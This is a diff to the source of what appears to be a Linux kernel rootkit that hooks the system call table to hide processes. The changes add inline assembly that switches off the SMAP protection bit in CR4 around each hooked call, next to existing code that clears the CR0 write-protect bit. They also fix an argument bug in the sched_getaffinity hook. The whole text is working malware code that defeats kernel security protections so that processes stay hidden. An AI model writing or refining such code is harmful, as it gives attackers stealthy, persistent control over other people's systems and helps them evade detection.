@@ -5,16 +5,32 @@
 #include "hooks.h"
 #include "hiding.h"
 
-// Custom write_cr0, as the one the kernel provides checks if we are overwriting the WP bit
-#define write_cr0(val) asm volatile("mov %0, %%cr0":"+r" (val), "=m" (__force_order));
+// Custom write_cr0 and custom write_cr4, as the ones the kernel provides 
+// check if we are overwriting important bits
+#define WP_BIT_IN_CR0 16
+#define SMAP_BIT_IN_CR4 21
+
+#define write_cr0(val) asm volatile("mov %0, %%cr0":"+r" (val), "+m" (__force_order));
+#define write_cr4(val) asm volatile("mov %0, %%cr4":"+r" (val));
 
 void ENABLE_WRITE(void){
-	unsigned long val = read_cr0() & (~(1<<16));
+	unsigned long val = read_cr0() & (~(1<<WP_BIT_IN_CR0));
 	write_cr0(val)
 }
 void DISABLE_WRITE(void){
-	unsigned long val = read_cr0() | (1<<16);
+	unsigned long val = read_cr0() | (1<<WP_BIT_IN_CR0);
 	write_cr0(val)
+}
+void ENABLE_SMAP(void){
+	unsigned long val = native_read_cr4() | (1<<SMAP_BIT_IN_CR4);
+	write_cr4(val);
+}
+void DISABLE_SMAP(void){
+	unsigned long val = native_read_cr4() & (~(1<<SMAP_BIT_IN_CR4));
+	write_cr4(val);
+}
+bool IS_SMAP_ENABLED(void){
+	return (native_read_cr4() & (1<<SMAP_BIT_IN_CR4)) != 0;
 }
 
 
@@ -71,7 +87,11 @@ unsigned long *syscall_table = NULL;
 	asmlinkage ret_type sys_do_hook(name)(DECL_DO_HOOK(n_args, __VA_ARGS__));               \
 	asmlinkage ret_type (*sys_orig(name))(DECL_ORIG_HOOK(n_args, __VA_ARGS__));             \
 	asmlinkage ret_type sys_hook(name)(DECL_ORIG_HOOK(n_args, __VA_ARGS__)){                \
-		return sys_do_hook(name)(ARGS_DO_HOOK(n_args, __VA_ARGS__));                        \
+		bool smap = IS_SMAP_ENABLED();                                                      \
+		if (smap) DISABLE_SMAP();                                                           \
+		ret_type ret = sys_do_hook(name)(ARGS_DO_HOOK(n_args, __VA_ARGS__));                \
+		if (smap) ENABLE_SMAP();                                                            \
+		return ret;                                                                         \
 	}
 
 
@@ -230,7 +250,7 @@ asmlinkage long sys_getsid_do_hook(pid_t pid, const struct pt_regs* regs){
 
 asmlinkage long sys_sched_getaffinity_do_hook(pid_t pid, unsigned int len, unsigned long __user *user_mask_ptr, const struct pt_regs* regs){
 	if (check_pid(pid, "sched_getaffinity") == -1) return -ESRCH;
-	return sys_sched_getaffinity_orig(ARGS_ORIG(3, pid_t, pid, unsigned int, len, unsigned long __user*, *user_mask_ptr));
+	return sys_sched_getaffinity_orig(ARGS_ORIG(3, pid_t, pid, unsigned int, len, unsigned long __user*, user_mask_ptr));
 }
 
 asmlinkage long sys_sched_getparam_do_hook(pid_t pid, struct sched_param __user *param, const struct pt_regs* regs){
